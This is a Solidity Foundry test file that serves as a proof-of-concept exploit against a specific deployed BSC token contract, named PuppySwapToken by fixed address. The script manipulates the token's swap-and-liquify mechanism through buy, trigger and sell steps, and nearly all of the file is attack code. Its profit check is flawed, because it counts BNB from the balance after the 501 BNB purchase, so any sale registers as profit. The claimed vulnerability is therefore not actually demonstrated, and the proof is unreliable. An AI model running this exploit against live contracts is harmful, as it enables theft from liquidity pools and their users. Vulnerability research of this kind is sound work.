pragma solidity ^0.6.8;

import "forge-std/Test.sol";

// Interfaces extracted from the source code
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactETHForTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);
    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface PuppySwapToken is IBEP20 {
    function pancakeRouter() external view returns (address);
    function pancakePair() external view returns (address);
    function swapAndLiquifyEnabled() external view returns (bool);
    function activateContract() external;
    function owner() external view returns (address);
    function _maxTxAmount() external view returns (uint256);
    function _liquidityFee() external view returns (uint256);
    function _taxFee() external view returns (uint256);
    function rewardThreshold() external view returns (uint256);
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

contract ExploitTest is Test {
    address constant TARGET = 0xeFfAb18108124C2b6280C62abA70a03c79cc4327;
    address attacker = address(0xdeadbeef);
    address victim = address(0xbeefdead);

    PuppySwapToken token;
    IPancakeRouter02 router;
    address weth;
    address pair;
    address owner;

    function setUp() public {
        token = PuppySwapToken(TARGET);
        router = IPancakeRouter02(token.pancakeRouter());
        weth = router.WETH();
        pair = token.pancakePair();
        owner = token.owner();

        vm.label(TARGET, "PuppySwapToken");
        vm.label(address(router), "PancakeRouter");
        vm.label(pair, "PancakePair");
        vm.label(attacker, "attacker");
        vm.label(owner, "owner");

        // Give the owner BNB to cover gas (if impersonating)
        vm.deal(owner, 100 ether);
        // Give attacker BNB
        vm.deal(attacker, 1000 ether);

        // Enable swap & liquify and approve router via owner
        vm.startPrank(owner);
        token.activateContract(); // sets swapAndLiquifyEnabled = true, approves router
        vm.stopPrank();

        // Ensure the contract is activated
        assertTrue(token.swapAndLiquifyEnabled());
    }

    function testWrongLiquidityExploit() public {
        // === Step 1: Manipulate price by buying large amount of tokens ===
        // This will also accumulate liquidity fees in the contract
        uint256 buyAmount = 501 ether; // 501 BNB
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        vm.startPrank(attacker);
        router.swapExactETHForTokens{value: buyAmount}(0, path, attacker, block.timestamp + 600);
        vm.stopPrank();

        // Record attacker's BNB balance after the buy (used for profit calculation)
        uint256 attackerBNBAfterBuy = attacker.balance;

        // === Step 2: Ensure the contract has enough tokens to trigger swapAndLiquify ===
        // The contract received 8% liquidity fee from the purchase (if _liquidityFee = 8)
        // We need contract token balance >= minTokenNumberToSell (= 1e19 tokens)
        uint256 contractBalanceBeforeTrigger = token.balanceOf(TARGET);
        assertGe(contractBalanceBeforeTrigger, token._maxTxAmount() / 100, "Contract balance too low for trigger");

        // === Step 3: Trigger swapAndLiquify by a small transfer from attacker to a random address ===
        vm.prank(attacker);
        token.transfer(victim, 1e9); // small transfer, no fee effect

        // === Step 4: Attacker sells tokens back to the pool to capture arbitrage profit ===
        // Approve router to spend tokens
        vm.startPrank(attacker);
        uint256 attackerTokenBalance = token.balanceOf(attacker);
        token.approve(address(router), attackerTokenBalance);
        address[] memory sellPath = new address[](2);
        sellPath[0] = TARGET;
        sellPath[1] = weth;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            attackerTokenBalance,
            0,
            sellPath,
            attacker,
            block.timestamp + 600
        );
        vm.stopPrank();

        uint256 attackerBNBEnd = attacker.balance;
        uint256 profit = attackerBNBEnd - attackerBNBAfterBuy;

        // Assert profit > 0, demonstrating extraction of value due to flawed liquidity proportion
        emit log_named_uint("Attacker BNB profit", profit);
        assertGt(profit, 0, "Attacker should have profited from wrong liquidity proportion");
    }
}
